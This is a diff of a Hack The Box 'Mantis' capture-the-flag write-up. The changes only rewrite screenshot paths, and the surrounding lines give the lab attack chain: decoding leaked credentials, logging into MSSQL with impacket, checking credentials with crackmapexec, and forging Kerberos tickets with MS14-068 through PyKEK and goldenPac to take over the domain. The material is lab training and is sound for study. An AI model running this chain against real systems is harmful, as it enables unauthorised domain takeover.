@@ -19,7 +19,7 @@ nmap -sV -sC -oA nmap/mantis 10.10.10.52
 
 ###### Output 
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/nmap.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/nmap.png)
 
 ```sh
  nmap -sV -sC -oA nmap/mantis 10.10.10.52                                                                                          ─╯
@@ -128,17 +128,17 @@ so lets download the file
 wget http://10.10.10.52:1377/secure_notes -r -np -nH -cut-dirs=1 -R "index.html*"
 ```
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/wget.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/wget.png)
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/orchard.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/orchard.png)
 
 There is a whitespace in between this and at the end their is a password so i remove the white spaces to only have the information arranged well.
 
-![](Windows/Windows-Hard/Mantis/Screenshots/deb_notes.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/deb_notes.png)
 
 so lets convert the Binary to `ASCII`  with [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Binary('Space',8)&input=MDEwMDAwMDAwMTEwMDEwMDAxMTAxMTAxMDAxMDAwMDEwMTEwMTExMDAxMDExMTExMDEwMTAwMDAwMTAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTAxMDExMTAwMTEwMDAwMDExMTAwMTAwMTEwMDEwMDAwMTAwMDAx) 
 
-![](Windows/Windows-Hard/Mantis/Screenshots/cyberchef.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/cyberchef.png)
 
 now that we have this piece of credentials lets log into the account using the Server SQL For SQL Server, the notes is about the file name, nad this one has some base64 inside of it, `dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt`. That decodes to a string of hex:
 
@@ -148,7 +148,7 @@ you can explore [Base64ToHex](https://gchq.github.io/CyberChef/#recipe=From_Base
 echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
 ```
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/base64.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/base64.png)
 
 ```sh
 impacket-mssqlclient 'htb.local/admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
@@ -156,7 +156,7 @@ impacket-mssqlclient 'htb.local/admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
 
 we can now acces [Microsoft SQL](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`)
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/mssql.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/mssql.png)
 
 ```shell-session
 select name from sys.databases
@@ -166,14 +166,14 @@ USE orcharddb
 
 from this we see something tough it on  in a correct format 
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/mssqlcommands.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/mssqlcommands.png)
 
 Another method  the database was large, and I decided to switch to a GUI, `dbeaver`. On starting it, there’s a pop-up to connect to a database:
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/dbever.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/dbever.png)
 
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/connection.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/connection.png)
 
 lets do a validation of credential using crackmapexec 
 
@@ -181,7 +181,7 @@ lets do a validation of credential using crackmapexec
 crackmapexec smb 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
 ```
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/crackmapexec.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/crackmapexec.png)
 
 ##### Identify Exploit
 
@@ -231,7 +231,7 @@ Check DNS Resolution:
 nslookup mantis.htb.local
 ```
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/nslookup.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/nslookup.png)
 
 Verify that the KDC is reachable on port 88 (Kerberos)
 
@@ -239,7 +239,7 @@ Verify that the KDC is reachable on port 88 (Kerberos)
 nc -zv mantis.htb.local 88
 ```
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/kebros.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/kebros.png)
 
 
 I’ll use `ntpdate 10.10.10.52` to sync my host’s time to Mantis, as Kerberos requires the two clocks be in sync.
@@ -252,11 +252,11 @@ First I’ll test this config and try to generate a Kerberos ticket in need some
 sudo kinit james
 ```
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/knit.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/knit.png)
 
 `klist` will show the ticket:
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/klist.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/klist.png)
 
 james can connect to RPC
 
@@ -274,7 +274,7 @@ lookupname will reveal the SID
 lookupnames james
 ```
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/lookupname.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/lookupname.png)
 
 Once the SID has been obtained, it is possible to run PyKEK to generate a Kerberos ticket by
 running the command i was able to find a copy of `ms14-068.py` [here-PyKEK](https://github.com/mubix/pykek), and I’ll run it just like the help suggests:
@@ -302,11 +302,11 @@ The [MS14-068](https://www.trustedsec.com/blog/ms14-068-full-compromise-step-ste
 impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
 ```
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/goldenpac.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/goldenpac.png)
 
 then you can get the user flag and root flag 
 
-![](/Windows/Windows-Hard/Mantis/Screenshots/flags.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Hard/Mantis/Screenshots/flags.png)
 
 	-------------------------END successful attack @lesley----------------------
 
